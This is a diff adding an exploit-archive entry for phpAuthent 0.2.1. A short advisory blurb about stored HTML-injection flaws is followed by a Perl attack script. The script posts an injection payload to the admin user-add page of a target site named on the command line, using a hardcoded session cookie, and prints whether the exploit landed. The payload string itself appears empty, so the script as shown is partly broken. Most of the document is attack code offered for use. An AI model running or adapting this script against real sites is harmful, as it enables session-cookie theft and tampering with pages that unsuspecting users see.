@@ -1,0 +1,66 @@
+source: http://www.securityfocus.com/bid/38908/info
+
+
+phpAuthent is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+phpAuthent 0.2.1 is vulnerable; other versions may also be affected.
+
+# Exploit Title: phpAuthentAdmin  permanent XSS
+# Date: 2010-03-21
+# Author: Yoyahack
+# Software Link: http://sourceforge.net/projects/phpauth/files/phpAuthent/phpAuthent%200.2.1/phpAuthent-0.2.1-20050828-116.zip/download
+# Version: 0.2.1
+# Tested on: linux
+ 
+#Exploit:
+ 
+#!/usr/bin/perl
+#Autor: Yoyahack
+#Web: http://undersecurity.net
+#Gretz: OzX, p0fk, S[e]C, ksha, seth, champloo, SH4V....
+ 
+use LWP::UserAgent;
+use HTTP::Request::Common;
+ 
+#Source
+ 
+print q(---------------------------------
+Autor: Yoyahack
+Web: http://undersecurity.net
+Gretz: OzX, p0fk, S[e]C, ksha, seth, champloo, SH4V....
+---------------------------------
+);
+ 
+if(!$ARGV[0]){
+print "Insert web\n";
+print "Ex: www.webpage.com<http://www.webpage.com>\n";
+exit;
+}
+ 
+$xss = qq();
+my $ua = new LWP::UserAgent;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.2pre)".
+"Gecko/20100308 Ubuntu/9.10 (karmic) Namoroka/3.6.2pre");
+ 
+$response = $ua->request(
+   POST "http://$ARGV[0]/phpauthent/phpauthentadmin/useradd.php?action=create",
+   {
+   action => 'changerealname',
+   name => $xss,
+   action => 'rename',
+   login => 'aaa',
+   action=> 'password',
+   password => 'XSS',
+   action => 'changeemail',
+   email => 'XSS',
+   },
+'Cookie' => 'PHPSESSID=cf1c170aa9d334d6cec1514e721573e6',
+);
+$loc = 'index.php?msg=001';
+if($loc eq $response->header('location')){
+print "\n\nExploit send!\n";
+exit;
+}
+print "\n\nExploit Faield\n";
